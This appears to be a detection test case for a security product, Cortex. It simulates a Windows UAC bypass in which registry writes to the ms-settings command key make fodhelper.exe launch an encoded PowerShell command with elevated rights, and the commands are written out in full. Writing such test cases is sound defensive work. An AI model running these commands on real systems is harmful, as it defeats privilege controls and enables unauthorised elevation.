identity.name: UAC Bypass via fodhelper.exe Registry Hijack
identity.summary: An attacker uses fodhelper.exe to execute a PowerShell payload with elevated privileges by hijacking the registry key HKCU\Software\Classes\ms-settings\Shell\Open\command with DelegateExecute. Cortex
identity.description: An attacker uses fodhelper.exe to execute a PowerShell payload with elevated privileges by hijacking the registry key HKCU\Software\Classes\ms-settings\Shell\Open\command with DelegateExecute. Cortex should detect the fodhelper.exe execution and the registry write.

payload.code:
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\Command" /ve /d "powershell.exe -EncodedCommand JABwAHcAcwAgACgAJABwAHcAcwApACAALQBwAHcAcwAgACgAJABwAHcAcwApAA==" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\Command" /v DelegateExecute /d "" /f
fodhelper.exe

manual_steps: Not authored. Write and test cleanup before promotion.
